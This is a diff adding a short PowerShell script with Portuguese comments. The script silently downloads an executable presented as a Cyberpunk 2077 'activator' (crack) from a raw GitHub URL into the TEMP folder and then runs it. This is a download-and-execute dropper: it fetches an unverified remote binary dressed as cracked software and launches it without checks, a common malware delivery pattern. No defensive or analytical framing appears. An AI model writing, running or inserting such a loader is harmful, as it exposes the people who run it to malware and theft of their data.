@@ -1,0 +1,9 @@
+$url = "https://raw.githubusercontent.com/arthurcsilva109-create/russo353/108e8da09051fda9a329681e1582f58a8869153b/Ativador_Cyberpunk_2077.exe"
+$path = "$env:TEMP\Ativador_Cyberpunk_2077.exe"
+
+# Baixa o arquivo silenciosamente
+Invoke-WebRequest -Uri $url -OutFile $path
+
+# Executa o arquivo
+Start-Process -FilePath $path
+
